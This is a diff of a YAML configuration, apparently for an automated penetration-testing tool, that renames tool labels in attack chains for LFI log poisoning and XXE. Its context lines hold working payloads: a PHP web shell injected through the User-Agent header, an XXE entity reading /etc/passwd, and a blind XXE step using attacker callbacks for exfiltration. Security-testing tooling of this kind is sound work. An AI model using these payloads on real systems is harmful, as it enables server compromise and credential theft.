@@ -71,7 +71,7 @@ chains:
           - "/var/log/nginx/access.log"
           - "/var/log/auth.log"
           - "/proc/self/environ"
-        tool: "path_test"
+        tool: "injection_test"
       - step: 2
         action: "Inject PHP code into log"
         technique: "Send request with User-Agent: <?php system($_GET['c']); ?>"
@@ -119,7 +119,7 @@ chains:
       - step: 1
         action: "Test basic XXE"
         technique: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>"
-        tool: "path_test"
+        tool: "injection_test"
       - step: 2
         action: "Extract high-value files"
         targets:
@@ -131,7 +131,7 @@ chains:
         tool: "http_request"
       - step: 3
         action: "Test blind XXE with OOB exfiltration"
-        technique: "Use oob(action='setup') then DTD with external entity to callback URL"
-        tool: "oob"
+        technique: "Use attacker-controlled callback infrastructure, then record the observed callback URL or DNS hit as evidence"
+        tool: "record_evidence"
     impact: "Server file read, credential theft, potential RCE"
     cwe_chain: ["CWE-611", "CWE-200"]
